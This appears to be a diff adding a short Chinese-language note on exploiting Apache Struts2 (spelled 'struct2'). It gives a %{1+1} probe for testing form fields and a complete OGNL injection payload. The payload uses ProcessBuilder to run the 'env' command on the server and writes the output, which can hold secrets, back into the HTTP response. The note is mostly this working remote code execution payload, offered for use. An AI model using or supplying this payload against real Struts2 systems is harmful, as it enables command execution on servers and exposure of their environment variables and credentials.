@@ -1,0 +1,9 @@
+struct2:
+表单里提交%{1+1} 可以显示2
+执行命令
+env命令用于显示系统中已存在的环境变量，以及在定义的环境中执行指令
+%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
+
+struct2的工具的利用
+
+
